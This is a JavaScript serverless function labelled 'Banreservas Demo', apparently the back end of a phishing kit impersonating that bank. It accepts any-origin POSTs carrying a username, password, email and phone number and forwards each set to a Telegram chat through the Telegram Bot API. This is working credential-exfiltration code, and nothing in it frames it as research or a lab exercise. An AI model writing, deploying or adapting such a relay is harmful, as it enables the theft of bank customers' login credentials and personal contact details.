function escapeHtml(value) {
  return String(value ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function formatMessage(body) {
  const lines = [
    "<b>📋 Registro — Banreservas Demo</b>",
    "",
    `🕐 <b>Fecha:</b> ${escapeHtml(body.at || new Date().toISOString())}`,
    `📍 <b>Evento:</b> ${escapeHtml(body.type || "desconocido")}`,
  ];

  if (body.usuario) lines.push(`👤 <b>Usuario:</b> ${escapeHtml(body.usuario)}`);
  if (body.password) lines.push(`🔑 <b>Contraseña:</b> ${escapeHtml(body.password)}`);
  if (body.email) lines.push(`📧 <b>Correo:</b> ${escapeHtml(body.email)}`);
  if (body.phone) lines.push(`📱 <b>Teléfono:</b> ${escapeHtml(body.phone)}`);

  return lines.join("\n");
}

module.exports = async (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, X-Auth-Key");

  if (req.method === "OPTIONS") {
    return res.status(204).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  const authSecret = process.env.TELEGRAM_AUTH_SECRET;

  if (!token || !chatId || !authSecret) {
    return res.status(500).json({ error: "Telegram not configured on server" });
  }

  if (req.headers["x-auth-key"] !== authSecret) {
    return res.status(401).json({ error: "Unauthorized" });
  }

  const body = typeof req.body === "string" ? JSON.parse(req.body) : req.body || {};
  const text = formatMessage(body);

  try {
    const tgRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });

    const tgData = await tgRes.json();
    if (!tgRes.ok || !tgData.ok) {
      return res.status(502).json({ error: "Telegram API error", detail: tgData });
    }

    return res.status(200).json({ ok: true });
  } catch (err) {
    return res.status(500).json({ error: "Server error" });
  }
};
